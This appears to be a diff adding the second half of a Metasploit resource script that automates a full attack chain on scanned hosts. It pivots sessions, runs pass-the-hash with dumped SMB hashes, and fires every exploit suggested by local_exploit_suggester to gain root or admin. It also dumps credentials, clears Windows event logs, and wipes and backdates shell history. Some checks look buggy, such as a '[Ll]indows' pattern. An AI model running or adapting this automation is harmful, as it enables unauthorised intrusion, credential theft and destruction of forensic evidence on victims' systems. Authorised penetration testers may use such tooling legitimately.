+# If we get a login and OS type is Linux, test if it gets sudo
+if (framework.sessions.length > 0)
+  framework.db.hosts.each do |host|
+    if (host.os_name =~ /[Ll]inux/)
+	run_single("use post/multi/manage/sudo")
+	run_single("set SESSION 1")
+	run_single("run")
+	run_single("sessions -i 1 -c 'id -u'")
+	run_single("back")
+    end
+  end
+end
+
+# If there is an web service, do it's own scan
+framework.db.hosts.each do |host|
+    host.services.each do |serv|
+      if (serv.state == Msf::ServiceState::Open)
+	if ((serv.port.to_i == 80) or (serv.port.to_i == 443) or (serv.port.to_i == 8080))
+	  run_single("load wmap")
+	  run_single("wmap_sites -a http://#{line}")
+	  run_single("wmap_targets -t http://#{line}")
+	  run_single("wmap_run -t")
+	  run_single("wmap_run -e")
+	  run_single("wmap_vulns -l")
+	end
+      end
+    end
+end
+
+# After dump Windows hashes, try sys access with psexec
+if (framework.sessions.length > 0)
+  framework.db.hosts.each do |host|
+    if (host.os_name =~ /[Ww]indows/)
+	framework.db.creds.each do |creds|
+		next if (creds.ptype =~ /smb_hash/)
+      			run_single("resource /usr/share/metasploit-framework/scripts/resource/auto_pass_the_hash.rc")
+		end
+	end
+    end
+end
+
+# Call smb() & postenum() functions
+framework.db.hosts.each do |host|
+ if (host.os_name =~ /[Ww]indows/)
+     host.services.each do |serv|
+       if (serv.state == Msf::ServiceState::Open)
+	     if ((serv.port.to_i == 445) or (serv.port.to_i == 139))
+            	smb("#{line}")
+		postenum()
+	     end
+        end
+      end
+    end
+end
+
+# If there're some session, get some exploits for scalate to root \ admin
+expl = ''
+log = ''
+if (framework.sessions.length > 0)
+	sess = framework.sessions.length
+	print_good("#{sess}")
+	run_single("sessions -u #{sess}")
+	meter = sess + 1
+	run_single("use post/multi/recon/local_exploit_suggester")
+	run_single("set session #{meter}")
+	run_single("spool /root/output.txt")
+	run_single("run")
+	run_single("back")
+	file = File.open("/root/output.txt", "r")
+	log = file.read
+	log.each_line do |line|
+    		if line =~ /.* - exploit.*/
+        		expl += line
+    		end 
+	end 
+	run_single("spool off")
+	file.close
+	File.delete('/root/output.txt')
+
+	expl.gsub!(/.*\d.\d.\d.\d - /) { '' }
+	expl.gsub!(/:\s.*/) { '' }
+	expl.each_line do |line|
+		run_single("use #{line}")
+		run_single("set session #{meter}")
+		run_single("exploit -j")
+	end
+	run_single("sessions -l")
+#
+end
+
+# Post exploit on Linux
+if (framework.sessions.length > 0)
+  framework.db.hosts.each do |host|
+    if (host.os_name =~ /[Ll]indows/)
+	if ( "#{$ADMUSER}" != '' && "#{$ADMPASS}" != '')
+   		run_single("setg USERNAME = #{$ADMUSER}")
+   		run_single("setg PASSWORD = #{$ADMPASS}")
+	end
+    end
+  end
+end 
+
+if (framework.sessions.length > 0)
+  framework.db.hosts.each do |host|
+    if (host.os_name =~ /[Ll]indows/)
+      	run_single("sys_creds -s 1")
+      	run_single("sessions -i 1 -c 'echo > ~/.bash_history'")
+	run_single("sessions -i 1 -c 'touch -r /etc/passwd ~/.bash_history'")
+	run_single("sessions -i 1 -c 'export HISTSIZE=0'")
+    end
+  end
+end
+
+# Post exploit on Windows
+if (framework.sessions.length > 0)
+  framework.db.hosts.each do |host|
+    if (host.os_name =~ /[Ww]indows/)
+      	run_single("app_creds -s 1")
+      	run_single("sys_creds -s 1")
+      	run_single("clearev")
+    end
+  end
+end
+
+# Generate a XML report if there are some open session
+if (framework.sessions.length > 0)
+	run_single("db_export -f xml -a /root/#{line}.xml")
+	edtxml(line)
+	line="#{line}".chomp
+# huge XML's bug 
+#	decode64(line)
+	
+# To create PDF reports, install Apache's FOP from https://xmlgraphics.apache.org/fop/download.html on /opt
+if ($?.success?)
+	run_single("xsltproc --output /root/#{line}.fo --stringparam fop1.extensions 1 /root/metasploitReportTemplate.xsl /root/#{line}.xml")
+	run_single("/opt/fop /root/#{line}.fo /root/#{line}.pdf")
+end
+
+# Send PDF report to email with reportEmail plugin
+if ($?.success?)
+	run_single("reportEmail #{line}")
+end
+
+if ($?.success?)
+	File.delete("/root/#{line}.xml")
+	File.delete("/root/#{line}.fo")
+end
+
+end
+
+# If LDAP or AD user file exist, remove it
+if (File.file?('/root/uid.txt'))
+	File.delete('/root/uid.txt')
+end
+
+# Terminate all open sessions and remove host from DB to don't contaminate next scan
+run_single("sessions -K")
+framework.db.hosts.each do |host|
+if (host.address != nil || host.address != 0)
+	run_single("hosts -d")
+end
+end
+run_single("workspace -d #{line}")
+
+# after this host, back to original userfile
+if (userfile)
+	if (user_file != '')
+		run_single("setg USER_FILE #{pathdefault}#{user_file}")
+	else
+		run_single("setg USER_FILE #{pathdefault}unix_users.txt")
+	end
+end
+
+# Remove this IP from list to don't repeat it in case of script restart
+File.open(path, 'w+') {|file| file.write(remains)}
+}
+run_single("quit")
+</ruby>
